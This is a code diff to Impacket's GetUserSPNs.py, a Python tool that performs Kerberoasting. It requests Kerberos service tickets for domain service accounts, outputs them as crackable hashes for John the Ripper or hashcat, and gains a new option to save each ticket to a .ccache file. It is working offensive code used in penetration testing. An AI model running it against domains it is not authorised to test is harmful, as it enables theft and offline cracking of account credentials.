@@ -80,6 +80,7 @@ class GetUserSPNs:
         self.__target = None
         self.__requestTGS = options.request
         self.__kdcHost = cmdLineOptions.dc_ip
+        self.__saveTGS = cmdLineOptions.save
         if cmdLineOptions.hashes is not None:
             self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')
 
@@ -145,9 +146,8 @@ class GetUserSPNs:
 
         return TGT
 
-    @staticmethod
-    def outputTGS(tgs, username, fd=None):
-        decodedTGT = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, fd=None):
+        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
 
         # According to RFC4757 the cipher part is like:
         # struct EDATA {
@@ -160,19 +160,29 @@ class GetUserSPNs:
         #
         # In short, we're interested in splitting the checksum and the rest of the encrypted data
         #
-        if decodedTGT['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
+        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
             entry = '$krb5tgs$%d$*%s$%s$SPN*$%s$%s' % (
-                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGT['ticket']['realm'],
-                hexlify(str(decodedTGT['ticket']['enc-part']['cipher'][:16])),
-                hexlify(str(decodedTGT['ticket']['enc-part']['cipher'][16:])))
+                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'],
+                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),
+                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))
             if fd is None:
                 print entry
             else:
                 fd.write(entry+'\n')
         else:
             logging.error('Skipping %s/%s due to incompatible e-type %d' % (
-                decodedTGT['ticket']['sname']['name-string'][0], decodedTGT['ticket']['sname']['name-string'][1],
-                decodedTGT['ticket']['enc-part']['etype']))
+                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
+                decodedTGS['ticket']['enc-part']['etype']))
+
+        if self.__saveTGS is True:
+            # Save the ticket
+            logging.debug('About to save TGS for %s' % username)
+            ccache = CCache()
+            try:
+                ccache.fromTGS(tgs, oldSessionKey, sessionKey )
+                ccache.saveFile('%s.ccache' % username)
+            except Exception, e:
+                logging.error(str(e))
 
     def run(self):
         if self.__doKerberos:
@@ -252,7 +262,7 @@ class GetUserSPNs:
                                                                                 self.__kdcHost,
                                                                                 TGT['KDC_REP'], TGT['cipher'],
                                                                                 TGT['sessionKey'])
-                        self.outputTGS(tgs, user, fd)
+                        self.outputTGS(tgs, oldSessionKey, sessionKey, user, fd)
                     except Exception , e:
                         logging.error(str(e))
                 if fd is not None:
@@ -273,7 +283,8 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help = True, description = "Queries target domain for SPNs that are running under a user account")
 
     parser.add_argument('target', action='store', help='domain/username[:password]')
-    parser.add_argument('-request', action='store_true', default='False', help='Request TGS for users and output them in JtR/hashcat format (default False)')
+    parser.add_argument('-request', action='store_true', default='False', help='Requests TGS for users and output them in JtR/hashcat format (default False)')
+    parser.add_argument('-save', action='store_true', default='False', help='Saves TGS requested to disk. Format is <username>.ccache. Auto selects -request')
     parser.add_argument('-outputfile', action='store',
                         help='Output filename to write ciphers in JtR/hashcat format')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
@@ -318,6 +329,9 @@ if __name__ == '__main__':
 
     if options.aesKey is not None:
         options.k = True
+
+    if options.save is True:
+        options.request = True
 
     try:
         executer = GetUserSPNs(username, password, domain, options)
